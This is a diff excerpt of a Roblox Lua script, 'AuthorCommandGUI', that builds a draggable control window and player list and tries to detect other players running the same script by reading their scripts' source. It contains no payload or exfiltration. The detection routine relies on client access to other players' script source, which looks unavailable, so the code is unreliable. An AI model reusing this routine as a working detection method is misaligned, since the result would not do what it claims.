+    self.PlayerListFrame.Parent = contentFrame
+    
+    closeButton.MouseButton1Click:Connect(function()
+        self:HideGUI()
+    end)
+    
+    local dragging = false
+    local dragInput, dragStart, startPos
+    
+    local function update(input)
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+    
+    titleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = mainFrame.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    
+    titleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
+            dragInput = input
+        end
+    end)
+    
+    self.UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+    
+    return screenGui
+end
+
+function AuthorCommandGUI:SetupNetworkDetection()
+    self.Players.PlayerAdded:Connect(function(player)
+        wait(2)
+        self:CheckForScriptUser(player)
+    end)
+    
+    for _, player in ipairs(self.Players:GetPlayers()) do
+        if player ~= self.LocalPlayer then
+            self:CheckForScriptUser(player)
+        end
+    end
+end
+
+function AuthorCommandGUI:CheckForScriptUser(player)
+    coroutine.wrap(function()
+        wait(3)
+        
+        local success = pcall(function()
+            if player:FindFirstChild("PlayerScripts") then
+                local scripts = player.PlayerScripts:GetDescendants()
+                for _, script in ipairs(scripts) do
+                    if script:IsA("LocalScript") or script:IsA("Script") then
+                        local source = script.Source
+                        if source:find("SpecialPlayerDetector") or source:find("AuthorCommandGUI") then
+                            self:AddScriptUser(player.Name)
+                            break
+                        end
+                    end
+                end
+            end
+        end)
+    end)()
+end
+
+function AuthorCommandGUI:ShowGUI()
+    if not self.MainGUI then
+        self.MainGUI = self:CreateGUI()
+    end
+    
+    self.MainGUI.Enabled = true
+    self.IsGUIVisible = true
+    
+    if self.MiniIcon then
+        self.MiniIcon.Enabled = false
+    end
+    
+    self:UpdatePlayerList()
+end
+
+function AuthorCommandGUI:HideGUI()
+    if self.MainGUI then
+        self.MainGUI.Enabled = false
+        self.IsGUIVisible = false
+    end
+    
+    if self.MiniIcon then
+        self.MiniIcon.Enabled = true
+    end
+end
+
+function AuthorCommandGUI:Start()
+    if not self.LocalPlayer.Character then
+        self.LocalPlayer.CharacterAdded:Wait()
+    end
+    
+    wait(2)
+    
+    self.MiniIcon = self:CreateMiniIcon()
+    self:SetupNetworkDetection()
+    
+    self:ShowNotification("系统启动", "用户控制系统已加载", 3)
+end
+
+wait(3)
+AuthorCommandGUI:Start()
